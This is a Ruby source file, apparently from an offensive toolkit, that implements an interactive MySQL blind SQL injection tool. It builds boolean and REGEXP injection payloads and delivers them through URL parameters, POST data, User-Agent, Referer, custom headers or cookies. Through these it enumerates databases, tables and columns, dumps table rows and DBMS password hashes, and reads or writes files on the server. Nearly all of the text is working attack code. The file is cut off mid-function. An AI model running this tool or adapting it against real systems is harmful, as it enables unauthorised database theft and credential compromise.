# This is our MySQL Blind Based Injection Class
# Regexp & Boolean methods covered currently...
# This should house anything related to these types of Injections
# If you add, just update the usage and shell menu functions to make available

class MySQLBlindInjector
  def initialize
    puts
    @http=EasyCurb.new
    @tweak = TamperSQL.new
    @tweak.config
    @target_config = { 'BLIND' => false, 
      'METHODS' => [ 'BOOLEAN', 'REGEXP' ], 'METHOD' => 'BOOLEAN',
      'VERSION' => nil, 'USER' => nil, 'HOST' => nil, 
      'TMPDIR' => nil, 'DATADIR' => nil, 'BASEDIR' => nil, 
      'CURRENT_DB' => nil, 'CDB_TABLES' => [], 
      'DBS' => [], 'DB_TABLES' => {}, 
      'PRIVILEGED' => false, 'PASSWORDS' => [] }
  end

  # MySQL Blind Injector Help Menu
  def mysql_blind_usage
    puts "List of available commands and general description".light_yellow + ": ".white
    puts "back ".light_yellow + "       => ".white + "Return to Main Menu".light_red
    puts "basic".light_yellow + "       => ".white + "Get Basic Info (User, Version, etc)".light_red
    puts "dbs".light_yellow + "         => ".white + "Get Available Database Names".light_red
    puts "tables".light_yellow + "      => ".white + "Get Tables in Current DB".light_red
    puts "dbtables".light_yellow + "    => ".white + "Get Tables in Another DB".light_red
    puts "tcolumns".light_yellow + "    => ".white + "Find Columns for Table in Current DB".light_red
    puts "dbcolumns".light_yellow + "   => ".white + "Find Columns for Table in Another DB".light_red
    puts "tdump".light_yellow + "       => ".white + "Dump Table from current DB".light_red
    puts "dbdump".light_yellow + "      => ".white + "Dump Table from another DB".light_red
    puts "passwords".light_yellow + "   => ".white + "Dump DBMS Usernames & Passwords (privileged)".light_red
    # TBD => Add Search Option (By DB Name, Table Name, Column Name, Custom)
    # User can decide if it is run using LIKE statement, REGEXP or an EQUAL comparison
    # i.e. where column='password'; where username like %admin% or %super% or %moderator%;
    puts "fuzz_tables".light_yellow + " => ".white + "Fuzz Tables in DB".light_red
    puts "fuzz_cols".light_yellow + "   => ".white + "Fuzz Columns in Table".light_red
    puts "read".light_yellow + "        => ".white + "Read Files via load_file() (privileged)".light_red
    puts "write".light_yellow + "       => ".white + "Write Files via INTO OUTFILE (privileged)".light_red
    puts "save ".light_yellow + "       => ".white + "Save Basic Injection Info to Results directory".light_red
    print_line("")
  end

  # MySQL Union Injector Menu
  def mysql_blind_menu
    puts
    prompt = "(MySQL_Blind)> "
    while line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      case cmd
      when /^c$|^clear$|^cls$/i
        cls
        banner
        mysql_blind_menu
      when /^h$|^help$|^ls$/i
        puts
        mysql_blind_usage
        mysql_blind_menu
      when /^exit$|^quit$|^back$/i
        puts
        saveme
        print_error("Returning to Main Menu....")
        main_menu
      when /^!(.+)/
        cmd=$1.strip.chomp
        res = commandz(cmd)
        print_line("\n#{res.join().chomp}")
        mysql_blind_menu
      when /^local$|^OS$/i
        local_shell
        mysql_blind_menu
      when /^ip2host$|^host2ip$/i
        host = Readline.readline("   Target IP or Domain: ", true)
        dnsenum = DNSEnum.new(host.strip.chomp)
        ip, domain, hostname = dnsenum.host_info
        puts
        print_status("IP: #{ip}")
        print_status("Domain: #{domain}") unless domain == ip
        print_status("Hostname: #{hostname}\n\n")
        mysql_blind_menu
      when /^basic|^show basic|^get basic$/i
        print_line("")
        get_basic
        mysql_blind_menu
      when /^dbs$|^databases$|^show databases$/i
        print_line("")
        get_dbs
        mysql_blind_menu
      when /^tables|^show tables|^current tables|^show current tables/i
        print_line("")
        get_tables
        mysql_blind_menu
      when /^dbtables|^show dbtables|^tables.db|^database.tables|^tables.database/i
        print_line("")
        line = Readline.readline("(Database Name)> ", true)
        db_name = line.strip.chomp
        print_line("")
        get_tables_db(db_name)
        mysql_blind_menu
      when /^tcolumns|^table.column|^column.+table|^tblcol|^tcol/i
        print_line("")
        line = Readline.readline("(Table Name)> ", true)
        table_name = line.strip.chomp
        print_line("")
        get_columns_table('database()', table_name)
        mysql_blind_menu
      when /^dbcol|^db.col|^database.col|^dbscol/i
        print_line("")
        line = Readline.readline("(Database Name)> ", true)
        db_name = line.strip.chomp
        line = Readline.readline("(Table Name)> ", true)
        table_name = line.strip.chomp
        print_line("")
        get_columns_table(db_name, table_name)
        mysql_blind_menu
      when /^tdump|^tbldump|^table.dump/i
        print_line("")
        print_status("Database Dump Setup...")
        db_name = 'database()' if @target_config['CURRENT_DB'].nil?
        db_name = @target_config['CURRENT_DB'] unless @target_config['CURRENT_DB'].nil?
        line = Readline.readline("(Table Name)> ", true)
        table_name = line.strip.chomp
        line = Readline.readline("(Comma Separated List of Columns to Dump)> ", true)
        columns = line.strip.chomp.split(",")
        print_line("")
        query = "select count(#{columns[0]}) from #{table_name}"
        results = blind_basic_inject(query)
        if results.nil?
          start = 0
          print_error("Unable to determine number of entries in #{table_name}....")
          line = Readline.readline("(Number of Rows to try and dump)> ", true)
          stop = line.strip.chomp.to_i
        else
          print_good("#{table_name} contains #{results} entries...")
          print_caution("Do you want to dump all (Y/N)?")
          answer = gets.strip.chomp
          print_line("")
          if answer.upcase == 'Y' or answer.upcase == 'YES'
            start = 0
            stop = results.to_i
            print_status("OK, attempting to dump #{stop - start} entries...")
          else
            line = Readline.readline("(Starting Row Number)> ", true)
            start = line.strip.chomp.to_i
            line = Readline.readline("(Row Number to Stop on)> ", true)
            stop = line.strip.chomp.to_i
            print_line("")
            print_status("OK, attempting to dump #{stop - start} entries...")
          end
        end
        blind_data_dump(db_name, table_name, columns, start.to_i, stop.to_i)
        mysql_blind_menu
      when /^dbdump|^dbtdump|^dbtbldump|^db.table.dump/i
        print_line("")
        print_status("Database Dump Setup...")
        line = Readline.readline("(Database Name)> ", true)
        db_name = line.strip.chomp
        line = Readline.readline("(Table Name)> ", true)
        table_name = line.strip.chomp
        line = Readline.readline("(Comma Separated List of Columns to Dump)> ", true)
        columns = line.strip.chomp.split(",")
        print_line("")
        query = "select count(#{columns[0]}) from #{db_name}.#{table_name}"
        results = blind_basic_inject(query)
        if results.nil?
          start=0
          print_error("Unable to determine number of entries in #{db_name}.#{table_name}....")
          line = Readline.readline("(Number of Rows to try and dump)> ", true)
          stop = line.strip.chomp.to_i
        else
          print_good("#{db_name}.#{table_name} contains #{results} entries...")
          print_caution("Do you want to dump all (Y/N)?")
          answer = gets.strip.chomp
          print_line("")
          if answer.upcase == 'Y' or answer.upcase == 'YES'
            start = 0
            stop = results.to_i
            print_status("OK, attempting to dump #{stop - start} entries...")
          else
            line = Readline.readline("(Starting Row Number)> ", true)
            start = line.strip.chomp.to_i
            line = Readline.readline("(Row Number to Stop on)> ", true)
            stop = line.strip.chomp.to_i
            print_line("")
            print_status("OK, attempting to dump #{stop - start} entries...")
          end
        end
        blind_data_dump(db_name, table_name, columns, start.to_i, stop.to_i)
        mysql_blind_menu
      when /^password|^pass.dump|^dump.pass/i
        print_line("")
        blind_password_dump
        mysql_blind_menu
      when /^fuzz.table|^table.fuzz|^tbl.fuzz/i
        print_line("")
        while(true)
          print_caution("Select Table Fuzzing Option: ")
          print_caution("1) Fuzz Tables from Current DB")
          print_caution("2) Fuzz Tables from Another DB")
          answer = gets.chomp
          print_line("")
          if answer.to_i == 1
            db_name = 'CURRENT-DB'
            break
          elsif answer.to_i == 2
            line = Readline.readline("(Database Name)> ", true)
            db_name = line.chomp
            print_line("")
            break
          else
            print_line("")
            print_error("Oops, Didn't quite understand that one")
            print_error("Please Choose a Valid Option From Menu Below Next Time.....")
            print_line("")
          end
        end
        print_caution("Use custom fuzz file (Y/N)?")
        answer = gets.chomp
        print_line("")
        if answer.upcase == 'Y' or answer.upcase == 'YES'
          line = Readline.readline("(Path to Custom Fuzz File)> ", true)
          answer = line.strip.chomp
          print_line("")
          if File.exists?(answer)
            fuzz_file = answer
          else
            print_error("Problem loading custom file, using default list instead.....")
            fuzz_file="#{HOME}fuzz/common_tables.lst"
          end
        else
          fuzz_file = "#{HOME}fuzz/common_tables.lst"
        end
        tables = common_tables(db_name, fuzz_file)
        print_line("")
        if tables.empty?
          print_line("")
          print_error("Doesn't appear any tables were found!")
          print_error("Try updating your common_tables.lst file to include additional possibilitiess or check things manually, sorry.....")
          print_line("")
        else
          print_good("DB: #{db_name}") if @target_config['CURRENT_DB'].nil?
          print_good("DB: #{@target_config['CURRENT_DB']}") unless @target_config['CURRENT_DB'].nil?
          print_good("TABLES: #{@target_config['DB_TABLES']["#{db_name}"].join(", ").sub(/, $/, '')}")
        end
        mysql_blind_menu
      when /^fuzz.column|^column.fuzz|^col.fuzz/i
        print_line("")
        while(true)
          print_caution("Select Column Fuzzing Option: ")
          print_caution("1) Fuzz Columns from Table in Current DB")
          print_caution("2) Fuzz Columns from Table in Another DB")
          answer = gets.chomp
          print_line("")
          if answer.to_i == 1
            db_name = 'CURRENT-DB'
            break
          elsif answer.to_i == 2
            line = Readline.readline("(Database Name)> ", true)
            db_name = line.chomp
            break
          else
            print_line("")
            print_error("Oops, Didn't quite understand that one")
            print_error("Please Choose a Valid Option From Menu Below Next Time.....")
            print_line("")
          end
        end
        while(true)
          line = Readline.readline("(Table Name)> ", true)
          answer = line.strip.chomp
          print_line("")
          if not answer == ''
            table_name = answer
            break
          else
            print_error("Provie table name so we know where to fuzz columns!")
            print_line("")
          end
        end
        print_caution("Use custom fuzz file (Y/N)?")
        answer = gets.chomp
        print_line("")
        if answer.upcase == 'Y' or answer.upcase == 'YES'
          line = Readline.readline("(Path to Column Fuzz File)> ", true)
          answer = line.strip.chomp
          print_line("")
          if File.exists?(answer)
            fuzz_file = answer
          else
            print_error("Problem loading custom file, using default list instead.....")
            fuzz_file="#{HOME}fuzz/common_columns.lst"
          end
        else
          fuzz_file = "#{HOME}fuzz/common_columns.lst"
        end
        cols = common_columns(db_name, table_name, fuzz_file)
        print_line("")
        if cols.empty?
          print_line("")
          print_error("Doesn't appear any columns were found!")
          print_error("Try updating your #{fuzz_file} file to include additional possibilitiess or check things manually, sorry.....")
          print_line("")
        else
          print_good("DB: #{db_name}") if @target_config['CURRENT_DB'].nil?
          print_good("DB: #{@target_config['CURRENT_DB']}") unless @target_config['CURRENT_DB'].nil?
          print_good("TABLES: #{table_name}")
          print_good("COLUMNS: #{cols.join(", ").sub(/, $/, '')}")
        end
        mysql_blind_menu
      when /^read|^file read|^load.file/i
        print_line("")
        while(true)
          print_caution("Select File Reader Option: ")
          print_caution("1) Single File")
          print_caution("2) File Reader Shell")
          print_caution("3) Fuzz Readable Files")
          answer = gets.chomp
          if answer.to_i > 0 and answer.to_i <= 3
            case answer.to_i
            when 1
              line = Readline.readline("(File to Read)> ", true)
              file = line.strip.chomp
              read_file(file)
              break
            when 2
              print_status("Dropping to File Reader Pseudo Shell...")
              print_caution("Type the path and filename to read file off backend server...")
              print_caution("Type 'QUIT' or 'EXIT' to close!")
              print_line("")
              read_file_shell
              break
            when 3
              print_status("Prepping for File Reader Fuzzer...")
              read_file_fuzz
              break
            end
          else
            print_line("")
            print_error("Oops, Didn't quite understand that one")
            print_error("Please Choose a Valid Option From Menu Below Next Time.....")
            print_line("")
          end
        end
        mysql_blind_menu
      when /^write|^file write|^into.outfile/i
        print_line("")
        file_writer_setup
        mysql_blind_menu
      when /^save|^log/i
        print_line("")
        saveme
        mysql_blind_menu
      else
        puts
        print_error("Oops, Didn't quite understand that one!")
        print_error("Please try again...\n")
        mysql_blind_menu
      end
    end
  end

  # Confirm Blind Based Injection is possible
  # Simply use concat to reflect back some hex'd text we send
  def blind_check
    r = rand(10000)
    case $config['INJECTOR']['MYSQL']['BLIND']['METHOD']
    when 'REGXP'
      inj = "aNd 1=(SELECT #{r} REGEXP IF(#{r}=#{r},1,''))" # TRUE => No Errors Should be Present
      t = @tweak.tamper(inj)
      t2 = @tweak.space(t)
      injection_str = @tweak.comma(t2)
      case $config['INJECTOR']['MYSQL']['LOC']
      when 'URL'
        if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
          injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.get(injection)
        else # POST
          injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.post(injection_url, injection_data)
        end
      when 'UA'
        original_ua = $config['HTTP']['HTTP_USER_AGENT']
        $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['HTTP_USER_AGENT'] = original_ua
      when 'REF'
        original_ref = $config['HTTP']['REFERER']
        $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['REFERER'] = original_ref
      when 'HEADER'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      when 'COOKIE'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      end
      if not res[0] =~ /empty \(sub\)expression/
        @true = res[0]

	r=rand(10000)
	t = "aNd 1=(SELECT #{r} REGEXP IF(#{r}=#{r.to_i + 1},1,''))" # FALSE => Should trigger REGEXP Error
	t = @tweak.tamper(t)
	t2 = @tweak.space(t)
	injection_str = @tweak.comma(t2)
        case $config['INJECTOR']['MYSQL']['LOC']
        when 'URL'
          if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
            injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.get(injection)
          else # POST
            injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
            injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
            res = @http.post(injection_url, injection_data)
          end
        when 'UA'
          original_ua = $config['HTTP']['HTTP_USER_AGENT']
          $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['HTTP_USER_AGENT'] = original_ua
        when 'REF'
          original_ref = $config['HTTP']['REFERER']
          $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          $config['HTTP']['REFERER'] = original_ref
        when 'HEADER'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        when 'COOKIE'
          if not $config['HTTP']['HTTP_HEADERS_ADD']
            turn_off=true
            $config['HTTP']['HTTP_HEADERS_ADD'] = true
          end
          $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
          end
          if $config['INJECTOR']['MYSQL']['DATA'].nil?
            res = @http.get($config['INJECTOR']['MYSQL']['URL'])
          else
            res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
          end
          if turn_off
            $config['HTTP']['HTTP_HEADERS_ADD'] = false
          end
          $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
            $config['HTTP']['HTTP_HEADERS'].delete(k)
          end
        end
        if res[0] != @true and res[0] =~ /empty \(sub\)expression/
          print_good("Signs indicate Conditional REGEXP Based Blind Injection!")
          @target_config['BLIND'] = true
	end
      else
        @target_config['BLIND'] = false
        print_error("Errors encountered running REGEXP check!")
        print_error("Cant establish baseline for TRUE request, and we can't continue without proper baseline....")
      end
      if not @target_config['BLIND']
        print_error("Site doesnt appear to be vuln to Conditional REGEXP Blind Injections!")
        print_error("Check configuration and try again, sorry......")
      end
    when 'BOOLEAN'
      if (blind_true_false_inject("#{r}=#{r}") and not blind_true_false_inject("#{r}=#{r + 1}")) or (blind_true_false_inject("SELECT #{r} REGEXP #{r}") and not blind_true_false_inject("SELECT #{r} REGEXP #{r + 1}"))
        print_good("Signs indicate Boolean Based Blind Injection!")
        @target_config['BLIND'] = true
      else
        print_error("Site doesnt appear to be Boolean Blind injectable!")
        print_error("Check configuration and try again, sorry......")
        @target_config['BLIND'] = false
      end
    end
    if @target_config['BLIND']
      ver  = [ 'version()', '@@version', '@@GLOBAL.VERSION' ]
      # Find Version of DB we are injecting
      if @target_config['VERSION'].nil?
        print_status("Grabbing Version to Confirm...")
        while(@target_config['VERSION'].nil?)
          ver.each do |version|
            print_status("Trying #{version}...")
            results = blind_basic_inject(version)
            if not results.nil?
              @target_config['VERSION'] = results
              print_good("Windows Backend OS Detected!") if @target_config['VERSION'] =~ /-nt-log/
              print_good("Version:  #{@target_config['VERSION']}")
              break
            end
          end
          if @target_config['VERSION'].nil?
            print_error("Unable to determine Version!")
          end
          break
        end
        if @target_config['VERSION'].nil?
          @target_config['BLIND'] = false
          return false
        else
          return true
        end
      else
        print_good("Version:  #{@target_config['VERSION']}")
      end
    else
      @target_config['BLIND'] = false
      return false
    end
  end

  # Get some basic information from database if we can
  def get_basic
    ver  = [ 'version()', '@@version', '@@GLOBAL.VERSION' ]
    cdb  = [ 'database()', '@@database', 'schema()', 'current_database()' ]
    usr  = [ 'user()', 'system_user()', 'current_user()', 'session_user()' ]
    srvn = [ '@@hostname' ]
    dirz = [ '@@datadir', '@@basedir', '@@tmpdir' ]

    print_status("############### BASIC INFO ##################")
    # Find Hostname of DB Server
    if @target_config['HOST'].nil?
      print_status("Grabbing Hostname....")
      while(@target_config['HOST'].nil?)
        srvn.each do |server_name|
          results = blind_basic_inject(server_name)
          if not results.nil?
            @target_config['HOST'] = results
            print_good("Hostname: #{@target_config['HOST']}")
            break
          end
        end
        print_error("Unable to determine Hostname!") if @target_config['HOST'].nil?
        break
      end
    else
      print_good("Hostname: #{@target_config['HOST']}")
    end

    # Find Version of DB we are injecting
    if @target_config['VERSION'].nil?
      print_status("Grabbing Version info....")
      while(@target_config['VERSION'].nil?)
        ver.each do |version|
          results = blind_basic_inject(version)
          if not results.nil?
            @target_config['VERSION'] = results
            print_good("Windows Backend OS Detected!") if @blind_version =~ /-nt-log/
            print_good("Version:  #{@target_config['VERSION']}")
            break
          end
        end
        print_error("Unable to determine Version!") if @target_config['VERSION'].nil?
        break
      end
    else
      print_good("Version:  #{@target_config['VERSION']}")
    end

    # Find Current User Name
    if @target_config['USER'].nil?
      print_status("Grabbing Current User....")
      while(@target_config['USER'].nil?)
        usr.each do |user|
          results = blind_basic_inject(user)
          if not results.nil?
            @target_config['USER'] = results
            print_good("Username: #{@target_config['USER']}")
            break
          end
        end
        print_error("Unable to determine current Username!") if @target_config['USER'].nil?
        break
      end
    else
      print_good("Username: #{@target_config['USER']}")
    end

    # Find Current Database Name
    if @target_config['CURRENT_DB'].nil?
      print_status("Grabbing Current Database....")
      while(@target_config['CURRENT_DB'].nil?)
        cdb.each do |current_db|
          results = blind_basic_inject(current_db)
          if not results.nil?
            @target_config['CURRENT_DB'] = results
            print_good("Database: #{@target_config['CURRENT_DB']}")
            break
          end
        end
        print_error("Unable to determine current database name!") if @target_config['CURRENT_DB'].nil?
        break
      end
    else
      print_good("Database: #{@target_config['CURRENT_DB']}")
    end

    # Find Directory Information (Datadir, basedir, tmpdir)
    while(true)
      dirz.each do |dirpath|
        case dirpath
        when '@@basedir'
          if @target_config['BASEDIR'].nil?
            print_status("Grabbing @@basedir....")
            results = blind_basic_inject(dirpath)
            @target_config['BASEDIR'] = results unless results.nil?
            print_good("Basedir:  #{@target_config['BASEDIR']}") unless results.nil?
            print_error("No Results for #{dirpath}") if results.nil?
          else
            print_good("Basedir:  #{@target_config['BASEDIR']}")
          end
        when '@@datadir'
          if @target_config['DATADIR'].nil?
            print_status("Grabbing @@datadir....")
            results = blind_basic_inject(dirpath)
            @target_config['DATADIR'] = results unless results.nil?
            print_good("Datadir:  #{@target_config['DATADIR']}") unless results.nil?
            print_error("No Results for #{dirpath}") if results.nil?
          else
            print_good("Datadir:  #{@target_config['DATADIR']}")
          end
        when '@@tmpdir'
          if @target_config['TMPDIR'].nil?
            print_status("Grabbing @@tmpdir....")
            results = blind_basic_inject(dirpath)
            @target_config['TMPDIR'] = results unless results.nil?
            print_good("Tmpdir:   #{@target_config['TMPDIR']}") unless results.nil?
            print_error("No Results for #{dirpath}") if results.nil?
          else
            print_good("Tmpdir:   #{@target_config['TMPDIR']}")
          end
        end
      end
      break
    end
    print_status("#############################################")
  end

  # Try to enumerate the available databases
  def get_dbs
    if @target_config['DBS'].empty?
      if @target_config['VERSION'].scan(/./)[0].to_i < 5 and not @target_config['VERSION'].nil?
        # MySQL < 5
        print_error("DB Version: #{@target_config['VERSION']}")
        print_error("There is no information_schema to query.....")
        print_error("Unable to enumerate databases for MySQL < 5, try fuzzing them manually...")
      elsif @target_config['VERSION'].scan(/./)[0].to_i >= 5 or @target_config['VERSION'].nil?
        # MySQL >= 5
        results = blind_basic_inject('(select count(schema_name) from information_schema.schemata)')
        if results.nil?
          # This usually needs privs, but maybe in some case if info schema is blocked
          results = blind_basic_inject('(select count(distinct(db)) from mysql.db)')
          dbs_count = 0 unless not results.nil?
          print_error("Unable to get database count, flying a bit blind!") unless not results.nil?
          dbs_count = results unless results.nil?
          print_status("Requesting #{dbs_count} Databases Names....") unless results.nil?
        else
          dbs_count = results
          print_status("Requesting #{dbs_count} Databases Names....")
        end
        dbz=[]
        0.upto(dbs_count.to_i - 1).each do |zcount|
          results = blind_basic_inject("(select schema_name from information_schema.schemata limit #{zcount},1)")
          pad = ' ' * (results.size + 25) unless results.nil? or results == ''
          pad = ' ' * 50 if results.nil? or results == ''
          print "\r(#{zcount})> #{results}#{pad}".cyan unless results == ''
          dbz << results unless results == ''
        end
        print_line("")
        if dbz.empty?
          print_line("")
          print_error("Unable to get any database names!")
          print_error("Lack of privileges?")
          print_status("Possible Solutions include:")
          print_caution("A) Become HR's best friend by updating the code and sending him a copy")
          print_caution("B) Tweak Settings and try things again")
          print_caution("C) Be a bawz and do it manually")
          print_line("")
        else	
          @target_config['DBS'] = dbz
          print_good("DBS: #{dbz.join(', ').sub(/, $/, '')}")
        end
      end
    else
      print_good("DBS: #{@target_config['DBS'].join(', ').sub(/,$/, '')}")
    end
  end

  # Get the Tables from the Current Database
  # Returns string of tablenames separated by space (for easy splitting later if need be)
  # Returns nil when nothing is found or problems are encounteredl
  def get_tables
    if @target_config['CDB_TABLES'].empty?
      if  not @target_config['VERSION'].nil?
        if @target_config['VERSION'].scan(/./)[0].to_i < 5 and not @target_config['VERSION'].nil?
          # MySQL < 5
          print_error("MySQL < 5: #{@target_config['VERSION']}")
          print_error("There is no information_schema to query for tables as result.....")
          if not @target_config['CURRENT_DB'].nil?
            print_error("Do you want to try Common Table Names (Y/N)?")
            answer = gets.chomp
            print_line("")
            if answer.upcase == 'Y' or answer.upcase == 'YES'
              tables = common_tables('CURRENT-DB', "#{HOME}fuzz/common_tables.lst")
              if tables.empty?
                print_error("OK, returning to menu...")
                return nil
              else
                print_good("DB: #{@target_config['CURRENT_DB']}")
                print_good("Tables: #{tables.join(', ').sub(/, $/, '')}")
                @target_config['CDB_TABLES'] = tables
                @target_config['DB_TABLES']["#{@target_config['CURRENT_DB']}"] = @target_config['CDB_TABLES'] unless @target_config['CURRENT_DB'].nil?
                @target_config['DB_TABLES']['Current DB'] = @target_config['CDB_TABLES'] if @target_config['CURRENT_DB'].nil?
                return tables.join(' ')
              end
            else
              print_error("OK, returning to menu...")
              return nil
            end
          else
            print_error("OK, returning to menu...")
            return nil
          end
        elsif @target_config['VERSION'].scan(/./)[0].to_i >= 5 or @target_config['VERSION'].nil?
          # MySQL >=  5
          if @target_config['CURRENT_DB'].nil?
            print_error("Current DB has not yet been discovered!")
            print_error("Try BASIC command if you haven't already!")
            print_error("You can also use DBTABLES command if you know the DB Name....")
            print_error("FUZZ_TABLES can be used as a last resort as well if you know the DB Name...")
            return nil
          else
            tables=[]
            query = 'select count(table_name) from information_schema.tables where table_schema=database()'
            results = blind_basic_inject(query)
            if results.nil?
              query = 'select count(table_name) from information_schema.tables where table_schema=schema()'
              results = blind_basic_inject(query)
              if results.nil?
                query = "select count(table_name) from information_schema.tables where table_schema=#{@target_config['CURRENT_DB'].mysqlhex}"
                results = blind_basic_inject(query)
                if results.nil?
                  print_error("Unable to determine number of tables in current database, sorry....")
                end
              end
            end
            if not results.nil?
              tbls_count = results.to_i
              print_good("Fetching #{tbls_count} Tables from Current DB") unless results.nil?
              case query
              when /database()/
                dbn = 'database()'
              when /schema()/
                dbn = 'schema()'
              when /0x[a-z0-9]{1,}/
                dbn = "#{@target_config['CURRENT_DB'].mysqlhex}"
              end
              0.upto(tbls_count.to_i - 1).each do |zcount|
                results = blind_basic_inject("select table_name from information_schema.tables where table_schema=#{dbn} limit #{zcount},1")
                pad = ' ' * (results.size + 25) unless results.nil? or results == ''
                pad = ' ' * 50 if results.nil? or results == ''
                print "\r(#{zcount})> #{results}#{pad}".cyan unless results == ''
                tables << results unless results == ''
              end
              print_line("")
              if tables.empty?
                print_line("")
                print_error("Unable to get any tables from the current database!")
                print_error("Lack of privileges? IDK....")
                print_status("Possible Solutions include:")
                print_caution("A) Become HR's best friend by updating the code and sending him a copy")
                print_caution("B) Tweak Settings and try things again")
                print_caution("C) Be a bawz and do it manually")
                print_line("")
                return nil
              else	
                @target_config['CDB_TABLES'] = tables
                @target_config['DB_TABLES']["#{@target_config['CURRENT_DB']}"] = @target_config['CDB_TABLES']
                print_good("Current DB: #{@target_config['CURRENT_DB']}")
                print_good("Tables: #{tables.join(', ').sub(/, $/, '')}")
                return tables.join(' ')
              end
            else
              print_error("Do you want to try Common Table Names (Y/N)?")
              answer = gets.chomp
              print_line("")
              if answer.upcase == 'Y' or answer.upcase == 'YES'
                tables = common_tables('CURRENT-DB', "#{HOME}fuzz/common_tables.lst")
                if tables.empty?
                  print_error("OK, returning to menu...")
                  return nil
                else
                  print_good("DB: #{@target_config['CURRENT_DB']}")
                  print_good("Tables: #{tables.join(', ').sub(/, $/, '')}")
                  @target_config['CDB_TABLES'] = tables
                  @target_config['DB_TABLES']["#{@target_config['CURRENT_DB']}"] = @target_config['CDB_TABLES']
                  return tables.join(' ')
                end
              else
                print_error("OK, returning to menu...")
                return nil
              end
            end
          end
        end
      else
        print_error("No version info collected yet!")
        print_error("Try using the BASIC comamnd and then try again....")
        print_error("You could also use the FUZZ TABLES option....")
      end
    else
      print_good("DB: #{@target_config['CURRENT_DB']}") unless @target_config['CURRENT_DB'].nil?
      print_good("Tables: #{@target_config['CDB_TABLES'].join(', ').sub(/, $/, '')}")
      @target_config['DB_TABLES']["#{@target_config['CURRENT_DB']}"] = @target_config['CDB_TABLES'] unless @target_config['CURRENT_DB'].nil?
